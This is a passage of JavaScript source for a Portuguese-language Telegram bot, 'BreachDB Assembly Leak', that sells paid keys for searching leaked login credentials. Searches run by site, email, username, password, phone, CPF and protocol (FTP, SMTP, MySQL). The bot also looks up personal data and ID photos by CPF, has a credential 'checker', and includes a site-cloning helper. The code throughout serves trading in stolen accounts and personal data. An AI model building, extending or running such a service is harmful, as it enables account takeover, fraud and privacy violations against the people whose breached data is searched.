              [{ text: '📋 COPIAR SITE', callback_data: 'srch_copyurl', style: 'primary' }],
              [{ text: '🚀 SUBDOMÍNIOS', callback_data: 'srch_subdominios', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // ── MÓDULO PROTOCOLOS ──
    if (data === 'mod_protocolos') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `🔌 𝗠𝗢́𝗗𝘂𝗟𝗢 𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟𝗢𝗦\n\nEscolha a busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔌 FTP', callback_data: 'srch_ftp', style: 'primary' }, { text: '📡 SMTP', callback_data: 'srch_smtp', style: 'primary' }],
              [{ text: '🗄 MySQL', callback_data: 'srch_mysql', style: 'primary' }, { text: '🔌 Port8080', callback_data: 'srch_port8080', style: 'primary' }],
              [{ text: '🔌 Port8443', callback_data: 'srch_port8443', style: 'primary' }],
              [{ text: '◀️ VOLTAR', callback_data: 'search_menu', style: 'primary' }, { text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // Botão de tipo de busca — pergunta o valor
    if (data.startsWith('srch_')) {
      const fieldName = data.substring(5);
      const fieldLabels = {
        url: 'URL',
        email: 'E-MAIL',
        inurl: 'TERMO NA URL',
        inmail: 'PROVEDOR DE EMAIL',
        user: 'USUÁRIO',
        senha: 'SENHA',
        telefone: 'TELEFONE',
        ip: 'IP',
        cpf: 'CPF',
        cnpj: 'CNPJ',
        domain: 'DOMÍNIO',
        copyurl: 'COPIAR SITE',
        ftp: 'FTP',
        smtp: 'SMTP',
        mysql: 'MYSQL',
        port8080: 'PORT8080',
        port8443: 'PORT8443',
        whois: 'WHOIS',
        geoip: 'GEOIP',
        subdominios: 'Domínio (SUBDOMÍNIOS)',
      };
      const label = fieldLabels[fieldName] || fieldName;
      pendingSearch.set(userKey, fieldName);
      bot.answerCallbackQuery(callbackQuery.id, { text: `Digite o ${label} para buscar...` }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      const replyMarkup = cbIsGroup
        ? { force_reply: true, selective: true }
        : { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] };
      const extraText = cbIsGroup ? `_Responda a esta mensagem com o valor ou digite /cancelar para sair._` : `_Ou clique no botão abaixo para sair._`;

      return bot.sendMessage(chatId,
        `🔍 *Buscar por ${label}*\n\nEnvie o *${label}* que deseja buscar:\n\n` +
        `_Exemplo: \`valor\`_\n\n` + extraText,
        opts({ parse_mode: 'Markdown', reply_markup: replyMarkup })
      );
    }

    // Botão de consulta externa — pergunta o valor
    if (data === 'consultar_foto') {
      bot.answerCallbackQuery(callbackQuery.id, { text: 'Digite o CPF...' }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      pendingConsulta.set(userKey, 'foto');
      const replyMarkup = cbIsGroup
        ? { force_reply: true, selective: true }
        : { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] };
      const extraText = cbIsGroup ? `_Responda a esta mensagem com o CPF ou digite:_ \`/consulta foto 03140433735\`` : `_Ou clique no botão abaixo para sair._`;

      return bot.sendMessage(chatId,
        `📸 *Puxar Foto do Portal SISP*\n\nEnvie o *CPF* para buscar a foto:\n\n` +
        `_Exemplo: \`03140433735\`_\n\n` + extraText,
        opts({ parse_mode: 'Markdown', reply_markup: replyMarkup })
      );
    }

    // Botão de consulta externa — pergunta o valor
    if (data.startsWith('consultar_')) {
      const apiKey = data.substring(10);
      const api = CONSULTA_APIS[apiKey];
      if (!api) return;
      bot.answerCallbackQuery(callbackQuery.id, { text: `Digite o ${api.param}...` }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      pendingConsulta.set(userKey, apiKey);
      const replyMarkup = cbIsGroup
        ? { force_reply: true, selective: true }
        : { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] };
      const extraText = cbIsGroup ? `_Responda a esta mensagem com o valor ou digite:_ \`/consulta ${apiKey} valor\`` : `_Ou clique no botão abaixo para sair._`;

      return bot.sendMessage(chatId,
        `🔎 *${api.name}*\n\nEnvie o *${api.param}* para consultar:\n\n` +
        `_Exemplo: \`${apiKey === 'cep' ? '13405188' : apiKey === 'tel' || apiKey === 'tel_cpf' ? '42984138233' : 'valor'}\`_\n\n` + extraText,
        opts({ parse_mode: 'Markdown', reply_markup: replyMarkup })
      );
    }

    // Botão PUXAR DADOS (GRÁTIS) — abre menu de consulta
    // Botão PUXAR LOGINS — Menu de busca por logins
    if (data === 'puxar_logins') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return bot.sendMessage(chatId,
        `🚀 𝗣𝗨𝗫𝗔𝗥 𝗣𝗢𝗥 𝗗𝗔𝗗𝗢𝗦 𝗗𝗘 𝗟𝗢𝗚𝗜𝗡\n\nEscolha o módulo de busca:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🔗 URLS', callback_data: 'mod_urls', style: 'primary' }],
              [{ text: '✉️ EMAILS', callback_data: 'mod_emails', style: 'primary' }],
              [{ text: '👤 USUÁRIOS', callback_data: 'mod_usuarios', style: 'primary' }],
              [{ text: '📞 TELEFONE', callback_data: 'mod_telefone', style: 'primary' }],
                                          [{ text: '🚀 SUBDOMÍNIOS', callback_data: 'srch_subdominios', style: 'primary' }],
              [{ text: '🔌 PROTOCOLOS', callback_data: 'mod_protocolos', style: 'primary' }],
              [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        })
      );
    }

    // Botão CONSULTAR DADOS — Menu de consultas avançadas
    if (data === 'consultar_dados_menu') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return showConsultaMenu(chatId, threadId);
    }

    if (data === 'puxar_dados') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return showConsultaMenu(chatId, threadId);
    }

    // Botão FAZER OUTRA — volta ao menu de busca
    if (data === 'fazer_outra') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      return showConsultaMenu(chatId, threadId);
    }

    // Botão CANCELAR BUSCA
    if (data === 'cancel_search') {
      const run = runningSearches.get(chatId);
      if (run) {
        run.cancelled = true;
        runningSearches.delete(chatId);
      }
      pendingSearch.delete(chatId);
      pendingBoleto.delete(chatId);
      pendingConsulta.delete(chatId);
      bot.answerCallbackQuery(callbackQuery.id, { text: '⏹ Busca cancelada' }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      // Volta ao menu principal
      const mockMessage = {
        text: '/start',
        chat: msg.chat,
        from: callbackQuery.from,
        message_id: msg.message_id
      };
      bot.emit('message', mockMessage);
      return;
    }

    // Botão VOLTAR ao start
    if (data === 'back_start') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      // Simula o comando /start novamente para voltar ao menu principal
      const mockMessage = {
        text: '/start',
        chat: msg.chat,
        from: callbackQuery.from,
        message_id: msg.message_id
      };
      bot.emit('message', mockMessage);
      return;
    }

    // Botão SUBDOMÍNIOS
    if (data.startsWith('sub_')) {
      const queryId = data.substring(4);
      const stored = queryStore.get(queryId);

      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});

      if (!stored) {
        return bot.sendMessage(chatId, '❌ Consulta expirada. Faça a busca novamente.');
      }

      return sendSubdomainResults(chatId, stored.query, pool, stored.threadId);
    }

    // Botão ADICIONAR KEY
    if (data === 'addkey') {
      bot.answerCallbackQuery(callbackQuery.id, { text: '📨 Envie sua key no chat!' }).catch(() => {});
      const inGroup = groupChats.has(chatId);
      const addKeyMsg = inGroup
        ? `🔑 *Ativar Key Premium*\n\nEnvie sua key no formato:\n\`/key SUA-CHAVE\`\n\nOu cole sua key aqui no chat!\n\n💬 *Não tem key? Compre no privado!*`
        : `🔑 *Ativar Key Premium*\n\nEnvie sua key no formato:\n\`/key SUA-CHAVE\`\n\nOu cole sua key aqui no chat!\n\n💬 *Não tem key?* ${OWNER_PROFILE}`;
      const addKeyMarkup = inGroup
        ? { inline_keyboard: [] }
        : { inline_keyboard: [[{ text: '💬 SUPORTE', url: OWNER_PROFILE }]] };
      bot.sendMessage(chatId, addKeyMsg, opts({
        parse_mode: 'Markdown',
        reply_markup: addKeyMarkup
      }));
      return;
    }

    // Botão TESTAR COMPRA (admin)
    if (data === 'test_purchase') {
      bot.answerCallbackQuery(callbackQuery.id, { text: '🎁 Gerando key de teste...' }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      const testSeconds = 30 * 86400;
      const { key } = generateKey(testSeconds);
      const query = `INSERT INTO license_keys (key, duration_seconds) VALUES ($1, $2)`;
      await writePool.query(query, [key, testSeconds]);
      const keyText =
        `🧪 *Key de Teste*\n\n` +
        `Key: \`${key}\`\n` +
        `Duração: *30 dias*\n\n` +
        `Ative com: \`/key ${key}\`\n\n` +
        `Ou clique no botão abaixo:`;
      const activateInline = { reply_markup: { inline_keyboard: [[{ text: '🔑 ATIVAR KEY', callback_data: `activate_key_${key}`, style: 'primary' }]] } };
      await bot.sendMessage(chatId, keyText, opts({ parse_mode: 'Markdown', ...activateInline }));
      return;
    }

    // Ativar key pelo callback
    if (data.startsWith('activate_key_')) {
      const keyToActivate = data.substring(13);
      bot.answerCallbackQuery(callbackQuery.id, { text: '🎯 Ativando...' }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      const result = await activateKey(chatId, keyToActivate);
      await bot.sendMessage(chatId, result.message, opts({ parse_mode: 'Markdown' }));
      return;
    }

    // Botão TOTAL — Mostrar total de registros
    if (data === 'cmd_total') {
      if (chatId !== ADMIN_ID) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Comando restrito' }).catch(() => {});
        return;
      }
      bot.answerCallbackQuery(callbackQuery.id, { text: '📊 Carregando...' }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});
      try {
        const results = await Promise.allSettled(
          pool.pools.map(p => p.query(`SELECT reltuples::bigint AS count, current_setting('server_version') AS ver FROM pg_class WHERE relname = 'credentials'`))
        );
        let total = 0;
        let dbLines = '';
        results.forEach((r, i) => {
          const count = r.status === 'fulfilled' ? Number(r.value.rows[0]?.count || 0) : 0;
          total += count;
          dbLines += `• *DB${i+1}:* \`${count.toLocaleString('pt-BR')}\` registros\n`;
        });
        const formatted = total.toLocaleString('pt-BR');
        await bot.sendMessage(
          chatId,
          `📊 *ESTADO DA BASE*\n\n${dbLines}• *Total:* \`${formatted}\`\n• *Status:* \`ONLINE\` 🟢`,
          opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }]] } })
        );
      } catch (e) {
        bot.sendMessage(chatId, `❌ Erro: ${e.message}`, opts());
      }
      return;
    }

    // Botão VER PLANOS
    if (data === 'show_plans') {
      bot.answerCallbackQuery(callbackQuery.id).catch(() => {});
      const inGroup = groupChats.has(chatId);
      const plansMsg = inGroup
        ? `💬 *Comprar Key Premium*\n\n` +
          `Entre em contato no privado para adquirir sua key.`
        : `💬 *Comprar Key Premium*\n\n` +
          `Entre em contato comigo pra adquirir sua key:\n` +
          `${OWNER_PROFILE}`;
      const plansMarkup = inGroup
        ? { inline_keyboard: [] }
        : { inline_keyboard: [[{ text: '👨‍💻 FALAR COM ADMIN', url: OWNER_PROFILE }]] };
      return bot.sendMessage(chatId, plansMsg, opts({ parse_mode: 'Markdown', reply_markup: plansMarkup }));
    }

    // Botão PLANO SELECIONADO — mostra escolha Cartão ou Boleto
    if (data.startsWith('plan_')) {
      const planIdx = parseInt(data.substring(5));
      const plan = PLANS[planIdx];
      if (!plan) {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Plano inválido!' }).catch(() => {});
        return;
      }
      bot.answerCallbackQuery(callbackQuery.id, { text: `${plan.label} selecionado!` }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});

      await bot.sendMessage(chatId,
        `💳 *${plan.emoji} ${plan.label}*\n\n` +
        `📌 *Valor:* R$${(plan.priceCents / 100).toFixed(0)}\n` +
        `⏳ *Dias:* ${plan.days}\n\n` +
        `Escolha a forma de pagamento:`,
        opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '💳 Cartão de Crédito', callback_data: `pay_card_${planIdx}`, style: 'primary' }],
              [{ text: '📄 Boleto Bancário', callback_data: `pay_boleto_${planIdx}`, style: 'primary' }]
            ]
          }
        })
      );
      return;
    }

    // Pagamento via Cartão de Crédito
    if (data.startsWith('pay_card_')) {
      const planIdx = parseInt(data.substring(9));
      const plan = PLANS[planIdx];
      if (!plan) {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Plano inválido!' }).catch(() => {});
        return;
      }
      bot.answerCallbackQuery(callbackQuery.id, { text: `Gerando link de pagamento...` }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});

      if (!stripe) {
        const inGroup = groupChats.has(chatId);
        const paymentMsg = inGroup
          ? `❌ Pagamentos indisponíveis.`
          : `❌ Pagamentos indisponíveis. Contate: ${OWNER_PROFILE}`;
        return bot.sendMessage(chatId, paymentMsg, opts({ parse_mode: 'Markdown' }));
      }

      try {
        const session = await stripe.checkout.sessions.create({
          payment_method_types: ['card'],
          line_items: [{
            price_data: {
              currency: 'brl',
              product_data: { name: `Key ${plan.label} - BreachDB Assembly Leak` },
              unit_amount: plan.priceCents,
            },
            quantity: 1,
          }],
          mode: 'payment',
          metadata: { chat_id: String(chatId), days: String(plan.days) },
          success_url: `${process.env.BASE_URL || 'https://breachdb-production-c6e9.up.railway.app'}/api/pagamento-sucesso?session_id={CHECKOUT_SESSION_ID}`,
          cancel_url: `${process.env.BASE_URL || 'https://breachdb-production-c6e9.up.railway.app'}/api/pagamento-cancelado`,
        });

        await bot.sendMessage(chatId,
          `💳 *Pagamento via Cartão — ${plan.label}*\n\n` +
          `📌 *Valor:* R$${(plan.priceCents / 100).toFixed(0)}\n` +
          `⏳ *Dias:* ${plan.days}\n\n` +
          `Clique no link abaixo para pagar:\n` +
          `🔗 ${session.url}\n\n` +
          `_Após a confirmação, sua key será enviada automaticamente aqui!_`,
          opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: `💰 PAGAR AGORA — R$${(plan.priceCents / 100).toFixed(0)}`, url: session.url }]] } })
        );
      } catch (err) {
        console.error('[STRIPE CARD ERROR]', err.message);
        bot.sendMessage(chatId, `❌ Erro ao gerar pagamento: ${err.message}`, opts());
      }
      return;
    }

    // Pagamento via Boleto — pede CPF
    if (data.startsWith('pay_boleto_')) {
      const planIdx = parseInt(data.substring(11));
      const plan = PLANS[planIdx];
      if (!plan) {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Plano inválido!' }).catch(() => {});
        return;
      }
      bot.answerCallbackQuery(callbackQuery.id, { text: `📄 Vamos gerar seu boleto...` }).catch(() => {});
      bot.deleteMessage(chatId, msg.message_id).catch(() => {});

      // Armazena o plano pendente
      pendingBoleto.set(chatId, { plan, planIdx });

      await bot.sendMessage(chatId,
        `📄 *Pagamento via Boleto — ${plan.emoji} ${plan.label}*\n\n` +
        `📌 *Valor:* R$${(plan.priceCents / 100).toFixed(0)}\n` +
        `⏳ *Dias:* ${plan.days}\n\n` +
        `Para gerar o boleto, preciso do seu **CPF** (apenas números).\n` +
        `Exemplo: \`00000000000\`\n\n` +
        `_Envie o CPF nesta mensagem ou digite /cancelar para sair._`,
        opts({ parse_mode: 'Markdown' })
      );
      return;
    }

    // Botão PARAR CHECKER
    if (data.startsWith('stop_check_')) {
      bot.answerCallbackQuery(callbackQuery.id, { text: '⏹ Parando...' }).catch(() => {});
      const targetChatId = parseInt(data.substring(11));
      checkerStopSet.add(targetChatId);
      return;
    }
  });

  app.get('/api/bot', (req, res) => {
    res.send('🤖 Bot Assembly Leak ONLINE (POLLING)');
  });

  console.log('🤖 Bot iniciado. Apenas comandos / são processados.');
}

// ══════════════════════════════════════════════════════
// HELPERS /copyurl — Baixa página web como ZIP
// ══════════════════════════════════════════════════════

function fetchUrlBuffer(targetUrl, maxRedirects = 5, referer = null) {
  return new Promise((resolve, reject) => {
    if (maxRedirects <= 0) return reject(new Error('Muitos redirecionamentos'));
    const mod = targetUrl.startsWith('https') ? https : http;
    const options = {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      },
      timeout: 30000,
      rejectUnauthorized: false
    };

    try {
      const parsed = new URL(targetUrl);
      options.headers['Host'] = parsed.host;
      if (referer) {
        options.headers['Referer'] = referer;
      } else {
        options.headers['Referer'] = parsed.origin + '/';
      }
    } catch {}

    mod.get(targetUrl, options, (res) => {
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        let redirectUrl = res.headers.location;
        if (redirectUrl.startsWith('/')) {
          const u = new URL(targetUrl);
          redirectUrl = u.origin + redirectUrl;
        } else if (!redirectUrl.startsWith('http')) {
          const u = new URL(targetUrl);
          redirectUrl = u.origin + '/' + redirectUrl;
        }
        return fetchUrlBuffer(redirectUrl, maxRedirects - 1, referer).then(resolve).catch(reject);
      }
      if (res.statusCode < 200 || res.statusCode >= 300) {
        return reject(new Error(`HTTP ${res.statusCode}`));
      }
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const buffer = Buffer.concat(chunks);
        const encoding = res.headers['content-encoding'];
        if (encoding === 'gzip') {
          zlib.gunzip(buffer, (err, decoded) => {
            if (err) reject(err);
            else resolve(decoded);
          });
        } else if (encoding === 'deflate') {
          zlib.inflate(buffer, (err, decoded) => {
            if (err) reject(err);
            else resolve(decoded);
          });
        } else if (encoding === 'br' && typeof zlib.brotliDecompress === 'function') {
          zlib.brotliDecompress(buffer, (err, decoded) => {
            if (err) reject(err);
            else resolve(decoded);
          });
        } else {
          resolve(buffer);
        }
      });
      res.on('error', reject);
    }).on('error', reject).on('timeout', () => reject(new Error('Timeout')));
  });
}

function fetchUrlBufferWithRetry(targetUrl, maxRedirects = 5, referer = null, retries = 3) {
  return new Promise(async (resolve, reject) => {
    for (let attempt = 1; attempt <= retries; attempt++) {
      try {
        const buf = await fetchUrlBuffer(targetUrl, maxRedirects, referer);
        return resolve(buf);
      } catch (err) {
        if (attempt === retries) {
          return reject(err);
        }
        await new Promise(r => setTimeout(r, 400));
      }
    }
  });
}

function resolveAssetUrl(base, relative) {
  if (!relative || typeof relative !== 'string') return null;
  const trimmed = relative.trim().replace(/\\/g, '/');
  if (trimmed.startsWith('data:') || trimmed.startsWith('javascript:') || trimmed.startsWith('mailto:') || trimmed.startsWith('tel:') || trimmed.startsWith('#')) {
    return null;
  }
  try {
    return new URL(trimmed, base).href;
  } catch {
    return null;
  }
}

function extractPageAssets(html, baseUrl) {
  const assets = new Set();
  let tagMatch;
  let m;

  // 1. CSS <link href="..."> (suporta com/sem aspas)
  const linkTagRe = /<link\b[^>]*>/gi;
  while ((tagMatch = linkTagRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const hrefMatch = tagContent.match(/\bhref\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (hrefMatch) {
      const url = resolveAssetUrl(baseUrl, hrefMatch[1] || hrefMatch[2]);
      if (url) assets.add(url);
    }
  }

  // 2. JS <script src="..."> (suporta com/sem aspas)
  const scriptTagRe = /<script\b[^>]*>/gi;
  while ((tagMatch = scriptTagRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const srcMatch = tagContent.match(/\bsrc\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcMatch) {
      const url = resolveAssetUrl(baseUrl, srcMatch[1] || srcMatch[2]);
      if (url) assets.add(url);
    }
  }

  // 3. Imagens <img src="..."> e srcset (suporta com/sem aspas)
  const imgTagRe = /<img\b[^>]*>/gi;
  while ((tagMatch = imgTagRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const srcMatch = tagContent.match(/\bsrc\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcMatch) {
      const url = resolveAssetUrl(baseUrl, srcMatch[1] || srcMatch[2]);
      if (url) assets.add(url);
    }
    const srcsetMatch = tagContent.match(/\bsrcset\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcsetMatch) {
      const srcsetVal = srcsetMatch[1] || srcsetMatch[2];
      const parts = srcsetVal.split(',');
      for (const part of parts) {
        const urlPart = part.trim().split(/\s+/)[0];
        const url = resolveAssetUrl(baseUrl, urlPart);
        if (url) assets.add(url);
      }
    }
  }

  // 4. Fontes e Imagens em CSS url(...) no HTML
  const bgRe = /url\s*\(\s*["']?([^"')]+)["']?\s*\)/gi;
  while ((m = bgRe.exec(html)) !== null) {
    const url = resolveAssetUrl(baseUrl, m[1]);
    if (url) assets.add(url);
  }

  // 5. Favicon e icons adicionais
  const iconRe = /<link[^>]+href\s*=\s*(?:["']([^"']+)["']|([^\s>]+))[^>]*rel\s*=\s*["'](?:icon|shortcut icon|apple-touch-icon)["']/gi;
  while ((m = iconRe.exec(html)) !== null) {
    const url = resolveAssetUrl(baseUrl, m[1] || m[2]);
    if (url) assets.add(url);
  }

  // 6. Fontes e imports com @import no HTML/Style
  const importRe = /@import\s+(?:url\s*\(\s*["']?([^"')]+)["']?\s*\)|["']([^"']+)["'])/gi;
  while ((m = importRe.exec(html)) !== null) {
    const url = resolveAssetUrl(baseUrl, m[1] || m[2]);
    if (url) assets.add(url);
  }

  // 7. Vídeos, Áudios, embeds, frames, inputs de imagem
  const otherTagsRe = /<(?:video|audio|embed|iframe|input)\b[^>]*>/gi;
  while ((tagMatch = otherTagsRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const srcMatch = tagContent.match(/\bsrc\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcMatch) {
      const url = resolveAssetUrl(baseUrl, srcMatch[1] || srcMatch[2]);
      if (url) assets.add(url);
    }
  }

  // 8. Tags <source src="..." srcset="..."> (comum para vídeo/imagem responsiva)
  const sourceTagRe = /<source\b[^>]*>/gi;
  while ((tagMatch = sourceTagRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const srcMatch = tagContent.match(/\bsrc\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcMatch) {
      const url = resolveAssetUrl(baseUrl, srcMatch[1] || srcMatch[2]);
      if (url) assets.add(url);
    }
    const srcsetMatch = tagContent.match(/\bsrcset\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcsetMatch) {
      const srcsetVal = srcsetMatch[1] || srcsetMatch[2];
      const parts = srcsetVal.split(',');
      for (const part of parts) {
        const urlPart = part.trim().split(/\s+/)[0];
        const url = resolveAssetUrl(baseUrl, urlPart);
        if (url) assets.add(url);
      }
    }
  }

  // 9. Tags <object data="..."> e <track src="..."> (subtítulos e plugins)
  const objectTrackRe = /<(?:object|track)\b[^>]*>/gi;
  while ((tagMatch = objectTrackRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const srcMatch = tagContent.match(/\b(?:src|data)\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcMatch) {
      const url = resolveAssetUrl(baseUrl, srcMatch[1] || srcMatch[2]);
      if (url) assets.add(url);
    }
  }

  // 10. Links diretos para arquivos de mídia/downloads: <a href="video.mp4">
  const aTagRe = /<a\b[^>]*>/gi;
  const mediaExts = /\.(pdf|doc|docx|xls|xlsx|ppt|pptx|zip|rar|7z|mp4|webm|ogg|mov|avi|mp3|wav|m4a|aac|txt|csv)(?:\?|#|$)/i;
  while ((tagMatch = aTagRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const hrefMatch = tagContent.match(/\bhref\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (hrefMatch) {
      const urlPart = hrefMatch[1] || hrefMatch[2];
      if (mediaExts.test(urlPart)) {
        const url = resolveAssetUrl(baseUrl, urlPart);
        if (url) assets.add(url);
      }
    }
  }

  // 11. Animações Lottie (<lottie-player>) e arquivos JSON de animação
  const lottieTagRe = /<lottie-player\b[^>]*>/gi;
  while ((tagMatch = lottieTagRe.exec(html)) !== null) {
    const tagContent = tagMatch[0];
    const srcMatch = tagContent.match(/\b(?:src|data-src|data-animation-path)\s*=\s*(?:["']([^"']+)["']|([^\s>]+))/i);
    if (srcMatch) {
      const url = resolveAssetUrl(baseUrl, srcMatch[1] || srcMatch[2]);
      if (url) assets.add(url);
    }
  }

  // Captura genérica de arquivos .json declarados em atributos de dados (comum para animações customizadas)
  const jsonRe = /\b(?:src|data-src|data-animation-path|href)\s*=\s*["']([^"']+\.json(?:\?[^"']*)?)["']/gi;
  while ((m = jsonRe.exec(html)) !== null) {
    const url = resolveAssetUrl(baseUrl, m[1]);
    if (url) assets.add(url);
  }

  return Array.from(assets);
}

function assetUrlToPath(assetUrl, baseUrl) {
  try {
    const asset = new URL(assetUrl);
    const base = new URL(baseUrl);
    let filePath;
    if (asset.hostname === base.hostname) {
      filePath = asset.pathname + asset.search;
    } else {
      filePath = '/_external/' + asset.hostname + asset.pathname + asset.search;
    }
    if (filePath.startsWith('/')) filePath = filePath.substring(1);
    if (filePath.endsWith('/') || filePath === '') filePath += 'index.html';
    filePath = filePath.replace(/[?#&]/g, '_').replace(/:/g, '_');
    return filePath;
  } catch {
    return 'asset_' + Date.now();
  }
}

function rewritePageHtml(html, baseUrl, assetMap) {
  let result = html;
  const sortedEntries = Array.from(assetMap.entries()).sort((a, b) => b[0].length - a[0].length);
  for (const [originalUrl, localPath] of sortedEntries) {
    const escaped = originalUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    result = result.replace(new RegExp(escaped, 'g'), localPath);
    try {
      const asset = new URL(originalUrl);
      const base = new URL(baseUrl);
      if (asset.hostname === base.hostname) {
        const cleanPath = asset.pathname.startsWith('/') ? asset.pathname.substring(1) : asset.pathname;
        const escapedClean = cleanPath.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        // Match quotes or space or tag end: e.g. href="style.css", href=style.css, src='./style.css'
        result = result.replace(
          new RegExp(`(["'\\s=])(?:\\.\\/)?\\/?${escapedClean}(?:\\?[^"'\\s>]+)?(["'\\s>])`, 'g'),
          (match, p1, p2) => {
            if (p1 === '=') {
              return `=${localPath}${p2}`;
            } else if (p1 === '"' || p1 === "'") {
              return `${p1}${localPath}${p1}`;
            } else {
              return `${p1}${localPath}${p2}`;
            }
          }
        );
      }
    } catch {}
  }
  return result;
}

function getRelativePath(fromPath, toPath) {
  const fromParts = fromPath.split('/');
  const toParts = toPath.split('/');
  fromParts.pop();
  let i = 0;
  while (i < fromParts.length && i < toParts.length && fromParts[i] === toParts[i]) {
    i++;
  }
  const upCount = fromParts.length - i;
  const remainingTo = toParts.slice(i);
  let rel = '';
  for (let u = 0; u < upCount; u++) {
    rel += '../';
  }
  rel += remainingTo.join('/');
  return rel || './';
}

// Chamado pelo webhook do Stripe quando o pagamento é confirmado
export async function handlePaymentSuccess(chatId, days) {
  if (!_writePool || !bot) {
    console.error('[PAYMENT] Bot ou pool não inicializado');
    return;
  }
  try {
    const seconds = days * 86400;
    const { key } = generateKey(seconds);
    await _writePool.query(`INSERT INTO license_keys (key, duration_seconds) VALUES ($1, $2)`, [key, seconds]);
    await bot.sendMessage(chatId,
      `✅ *Pagamento confirmado!* 🎉\n\n` +
      `🔑 *Sua key:* \`${key}\`\n` +
      `⏳ *Duração:* ${formatDuration(seconds)}\n\n` +
      `Para ativar, use: \`/key ${key}\`\n` +
      `_Ou simplemente cole a key aqui no chat!_`,
      { parse_mode: 'Markdown' }
    );
  } catch (err) {
    console.error('[PAYMENT KEY ERROR]', err.message);
  }
}

// ============================================
// /copyurl — Baixa página web como ZIP
// ============================================
async function performCopyUrl(chatId, rawUrl, threadId) {
  const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
  let targetUrl = (rawUrl || '').trim();
  targetUrl = targetUrl.replace(/^[<`\[("'#]+|[>`\])"';,.]+$/g, '');
  const mdLinkMatch = targetUrl.match(/\]\((https?:\/\/[^\s\)]+)\)/i);
  if (mdLinkMatch) targetUrl = mdLinkMatch[1];
  else {
